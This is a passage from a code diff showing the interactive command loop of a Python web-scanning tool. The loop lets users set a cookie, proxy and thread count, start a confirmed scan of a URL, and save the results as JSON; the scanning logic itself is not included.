+        except (EOFError, KeyboardInterrupt):
+            print("\n\033[93m[!] Bye\033[0m")
+            break
+
+        if not line:
+            continue
+
+        parts = line.split(maxsplit=1)
+        cmd = parts[0].lower()
+        arg = parts[1].strip() if len(parts) > 1 else ""
+
+        if cmd in ('exit', 'quit', 'q'):
+            print("\033[93mBye.\033[0m")
+            break
+        elif cmd == 'cookie':
+            if arg:
+                st['cookie'] = arg
+                print("\033[92m[+] Cookie set\033[0m")
+        elif cmd == 'proxy':
+            if arg:
+                st['proxy'] = arg
+                print("\033[92m[+] Proxy set\033[0m")
+        elif cmd == 'threads':
+            if arg:
+                try:
+                    st['threads'] = int(arg)
+                    print("\033[92m[+] Threads: " + arg + "\033[0m")
+                except Exception:
+                    pass
+        elif cmd == 'status':
+            print("\n  Cookie: " + str(st['cookie']))
+            print("  Proxy: " + str(st['proxy']))
+            print("  Threads: " + str(st['threads']) + "\n")
+        elif cmd == 'clear':
+            os.system('clear')
+            print(LOGO)
+        elif cmd == 'save':
+            if st['last'] and arg:
+                st['last'].save_json(arg)
+        elif is_url(cmd):
+            url = cmd if cmd.startswith(('http://', 'https://')) else 'http://' + cmd
+            print("\n\033[93m[?]\033[0m Scanning: \033[1m" + url + "\033[0m")
+            conf = input("\033[93m    Start? (y/n): \033[0m").strip().lower()
+            if conf not in ('y', 'yes', ''):
+                continue
+            cl = Client(timeout=10, cookie=st['cookie'], proxy=st['proxy'])
+            sc = Scan(url, cl, threads=st['threads'])
+            try:
+                sc.run_all()
+                st['last'] = sc
+            except KeyboardInterrupt:
+                print("\n\033[93m[!] Stopped\033[0m")
+                st['last'] = sc
+            except Exception as e:
+                print("\n\033[91m[!] Error: " + str(e) + "\033[0m")
+        else:
+            print("\033[91m[!] Unknown: " + cmd + "\033[0m")
+
+
+if __name__ == '__main__':
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n\033[93m[!] Bye\033[0m")
